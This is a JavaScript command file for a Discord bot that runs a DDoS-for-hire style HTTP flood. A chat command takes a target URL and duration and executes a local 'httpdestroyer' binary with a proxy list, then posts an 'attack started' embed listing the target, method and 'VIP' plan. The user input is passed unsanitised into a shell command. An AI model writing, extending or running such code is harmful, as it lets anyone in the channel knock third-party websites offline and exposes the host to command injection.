const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('1806F8')
	.setTitle('WARRING')
	.setDescription("`Ex .https https://nasdas.fr/ 60`")
	.setFooter("Please do not attack government website!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`./httpdestroyer ${host} ${duration} 35 100 proxy.txt`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('1806F8')
	.setTitle(' **Wawa** ')
	.setTimestamp()
  .setDescription("**Plan**: `VIP 👨` \n **Target** : `" + host + "` \n **Method** : `https 💣` \n **Time** : `" + duration + "`")
	.setFooter('Interpol.gov', client.user.avatarURL)
	.setTimestamp()
	.setImage(attackgif)
	.setThumbnail("")
 message.channel.send(embed);
 }, 2000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://cdn.discordapp.com/attachments/1023074923566092298/1278577197803634740/8d654a13763bdec3d37ab4180c8b66e6.gif?ex=66d14f4e&is=66cffdce&hm=9a0f7ef8d549557827b6eec8e13d55f09f4b9765e687a443cda885b882adaca8&",];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];


  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['https'],
  permLevel: 0
}

exports.help = {
  name: 'https',
  description: 'interpol',
  usage: 'https'
}
